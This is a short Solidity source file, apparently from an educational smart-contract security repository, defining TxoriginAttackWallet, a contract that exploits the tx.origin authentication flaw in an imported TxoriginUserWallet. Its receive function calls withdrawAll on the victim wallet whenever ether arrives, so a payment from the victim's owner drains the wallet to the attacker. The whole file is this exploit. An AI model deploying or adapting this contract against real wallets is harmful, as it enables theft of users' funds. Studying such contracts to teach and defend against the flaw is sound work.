// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./TxoriginUserWallet.sol";

contract TxoriginAttackWallet {
    address payable public owner;
    TxoriginUserWallet wallet;

    constructor(address payable _wallet)
	{
		wallet = TxoriginUserWallet(_wallet);
        owner = payable(msg.sender);
    }

    receive() external payable 
	{
        wallet.withdrawAll(owner);
    }
}